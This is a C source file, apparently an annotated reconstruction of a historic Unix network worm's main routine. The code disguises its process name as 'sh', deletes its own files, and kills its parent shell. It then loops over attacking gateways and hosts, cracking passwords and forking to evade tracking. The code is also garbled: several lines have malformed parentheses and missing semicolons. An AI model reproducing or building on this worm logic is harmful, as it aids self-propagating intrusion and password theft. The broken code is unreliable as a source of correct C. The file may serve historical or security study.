#include <stdio.h>

#include <signal.h>

#include <string.h>

#include <sys/resource.h>



long current_time;

struct rlimit no_core = {0,0};



int

main (argc, argv)

    int argc;

    char *argv[];



{

    int n;

    int parent = 0;

    int okay = 0;

        /* change calling name to "sh" */

    strcpy(argv[0], "sh");

        /* prevent core files by setting limit to 0 */

    setrlimit(RLIMIT_CORE, no_core);

    current_time = time(0);

        /* seed random number generator with time */

    srand48(current_time);

    n = 1;

    while (argv[n]) {

        /* save process id of parent */

        if (!strncmp(argv[n], "-p", 2)) {

            parent = atoi (argv[++n]);

            n++;

        }

        else {

            /* check for 1l.c in argument list */

            if (!strncmp(argv([n], "1l.c", 4))

                okay = 1;

            /* load an object file into memory */

            load_object (argv[n];

            /* clean up by unlinking file */

            if (parent)

                unlink (argv[n]);

            /* and removing object file name */

            strcpy (argv[n++], "");

        }

    

    }

        /* if 1l.c was not in argument list, quit */

    if (!okay)

        exit (0);

        /* reset process group */

    setpgrp (getpid());

        /* kill parent shell if parent is set */

    if (parent)

        kill(parent, SIGHUP);

        /* scan for network interfaces */

    if_init();

        /* collect list of gateways from netstat */

    rt_init();

        /* start main loop */

    doit();

}



int

doit()

{

    current_time = time (0);

        /* seed random number generator (again) */

    srand48(current_time);

        /* attack gateways, local nets, remote nets */

    attack_hosts();

        /* check for a "listening" worm */

    check_other ()

        /* attempt to send byte to "ernie" */

    send_message ()

    for (;;) {

        /* crack some passwords */

    crack_some ();

        /* sleep or listen for other worms */

    other_sleep (30);

    crack_some ();

        /* switch process id's */

        if (fork())

            /* parent exits, new worm continues */

            exit (0);

        /* attack gateways, known hosts */

        attack_hosts();

        other_sleep(120);

            /* if 12 hours have passed, reset hosts */

        if(time (0) == current_time + (3600*12)) {

            reset_hosts();

            current_time = time(0); }

            /* quit if pleasequit is set, and nextw>10 */

        if (pleasequit && nextw > 10)

            exit (0);

    }

}

